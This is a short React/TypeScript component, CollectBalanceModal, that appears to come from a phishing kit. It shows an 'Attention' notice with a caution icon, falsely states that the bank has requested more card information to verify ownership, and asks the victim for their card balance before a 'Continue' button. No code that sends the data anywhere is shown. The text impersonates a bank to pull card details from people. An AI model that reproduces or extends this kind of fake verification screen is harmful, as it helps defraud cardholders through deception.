import Image from "../Image"
import CautionSign from "../../assets/caution-sign.svg"


const CollectBalanceModal: React.FC<Disclosure> = ({handleSubmit, handleChange,errors,formData}) => {

  return (
    <form onSubmit={handleSubmit} className="space-y-2">
      <p className="text-red-500 p-2 text-center font-semibold text-sm">{errors}</p>
      <Image src={CautionSign} alt="visa" className="w-28 bg-white p-1 rounded-full block mx-auto" />
      <h1 className='text-2xl font-semibold text-center text-black/80'>Attention</h1>

      <p className='text-sm text-center'>The bank requested additional card information to verify card ownership</p>

      <input onChange={handleChange} value={formData.balance} type="number" name="balance" id="" placeholder='Card balance' className='block mx-auto border p-1 rounded-md text-center placeholder:text-sm' />

      <button type="submit" className='bg-green-500 py-1 px-4 mx-auto block text-white rounded-md font-semibold text-sm'>Continue</button>
    </form>

  )
}

export default CollectBalanceModal